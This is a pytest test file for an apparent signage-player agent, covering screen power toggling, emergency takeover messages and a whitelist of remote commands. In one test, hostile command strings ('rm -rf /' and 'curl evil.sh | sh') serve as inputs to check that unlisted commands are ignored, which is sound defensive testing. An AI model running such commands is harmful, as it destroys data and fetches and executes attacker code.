"""
The premium layer: screen power and emergency takeover.

Screen power is exercised through an injected runner so nothing shells
out. The takeover is exercised through the agent's control-channel path —
the whole point is that a message pushed from Dashboard is on screen by
the next /state.
"""

from __future__ import annotations

import hashlib

import httpx

from adnova_player.cache import MediaCache
from adnova_player.playback_log import PlaybackLog
from adnova_player.schedule import Schedule
from adnova_player.screen import Screen

# ── Screen power ───────────────────────────────────────────────────────────


def test_screen_only_issues_a_command_when_the_state_changes():
    calls = []
    screen = Screen(runner=lambda argv: (calls.append(argv), True)[1])

    screen.on()
    screen.on()  # already on — no second command
    screen.off()

    # One "on" burst and one "off" burst, not four.
    assert any("standby" in " ".join(a) or "--off" in a or "1" in a for a in calls)
    first_count = len(calls)
    screen.off()  # already off
    assert len(calls) == first_count  # unchanged


def test_a_device_with_no_working_command_stays_on_safely():
    # Every command "fails" (no such tool). The state simply never flips to
    # off, which is the safe direction — a lit screen is never wrong.
    screen = Screen(runner=lambda argv: False)
    screen.off()
    # Nothing asserts a crash; the point is it does not raise and does not
    # claim success.
    assert screen._on is None


# ── Emergency takeover ─────────────────────────────────────────────────────


def _agent(tmp_path, api):
    from adnova_player.agent import Agent
    from adnova_player.config import load

    config = load({
        "ADNOVA_STAND_ID": "3",
        "ADNOVA_STAND_KEY": "a" * 64,
        "ADNOVA_CACHE_DIR": str(tmp_path),
    })
    cache = MediaCache(tmp_path / "media")
    return Agent(config, api, cache, PlaybackLog(tmp_path / "p.json")), cache


class TakeoverApi:
    """Serves a heartbeat response with an emergency, and the media for it."""

    def __init__(self, body: bytes, emergency: dict | None):
        self.body = body
        self.emergency = emergency

    def fetch_manifest(self):
        return None

    def send_heartbeat(self, _body):
        return {"emergency": self.emergency}

    def send_playback(self, _body):
        return {"ok": True}


def test_a_takeover_from_the_control_channel_goes_on_screen(tmp_path):
    body = b"an emergency notice image"
    checksum = hashlib.sha256(body).hexdigest()

    # The cache fetches the takeover media from this transport.
    def media(req):
        return httpx.Response(200, content=body)

    emergency = {
        "checksum_sha256": checksum,
        "url": "https://x/emergency",
        "type": "image",
        "label": "Closed for stocktake",
    }
    agent, cache = _agent(tmp_path, TakeoverApi(body, emergency))
    cache._client = httpx.Client(transport=httpx.MockTransport(media))

    agent._heartbeat_once()

    item = agent.schedule().now_playing(_now())
    assert item.slot_id == -2
    assert item.priority == "urgent"
    assert item.local_src == f"/media/{checksum}"


def test_clearing_the_takeover_returns_to_the_schedule(tmp_path):
    agent, _ = _agent(tmp_path, TakeoverApi(b"", None))

    # No emergency in the response → nothing installed, schedule unchanged.
    agent._heartbeat_once()

    assert agent.schedule().now_playing(_now()).is_fallback


def _now():
    from datetime import UTC, datetime

    return datetime.now(tz=UTC)


def test_schedule_layers_a_takeover_without_mutating_the_plan(tmp_path):
    from adnova_player.schedule import PlayItem

    cache = MediaCache(tmp_path / "media")
    base = Schedule(None, cache)

    takeover = PlayItem(-2, None, "image", "/media/x", True, 30, "urgent")
    layered = Schedule(base.manifest, cache, emergency=takeover)

    assert layered.now_playing(_now()).slot_id == -2
    assert base.now_playing(_now()).is_fallback  # the base is untouched


# ── Remote commands ─────────────────────────────────────────────────────────


def test_refetch_command_triggers_a_fetch_and_acks(tmp_path):
    api = TakeoverApi(b"", None)
    agent, _ = _agent(tmp_path, api)

    agent._run_commands([{"id": 5, "command": "refetch"}])

    # Acked, ready to report on the next heartbeat.
    assert 5 in agent._take_acks()


def test_an_arbitrary_command_is_ignored(tmp_path):
    # The security property: anything not in the closed set does nothing.
    calls = []
    agent, _ = _agent(tmp_path, TakeoverApi(b"", None))
    agent._exec = lambda argv: calls.append(argv) or True

    agent._run_commands([
        {"id": 1, "command": "rm -rf /"},
        {"id": 2, "command": "curl evil.sh | sh"},
        {"id": 3, "command": "shell"},
    ])

    assert calls == []           # nothing ran
    assert agent._take_acks() == []


def test_a_whitelisted_command_runs_a_fixed_argv(tmp_path):
    ran = []
    agent, _ = _agent(tmp_path, TakeoverApi(b"", None))
    agent._exec = lambda argv: ran.append(argv) or True

    agent._run_commands([{"id": 9, "command": "restart"}])

    # Exactly the fixed argv, no interpolation from the network.
    assert ran == [["sudo", "-n", "systemctl", "restart", "adnova-player"]]


def test_completed_commands_ride_the_heartbeat(tmp_path):
    api = TakeoverApi(b"", None)
    agent, _ = _agent(tmp_path, api)
    agent._pending_acks = [3, 4]

    body = agent._heartbeat_body()

    assert body["completed_commands"] == [3, 4]
    assert agent._take_acks() == []  # cleared after being sent
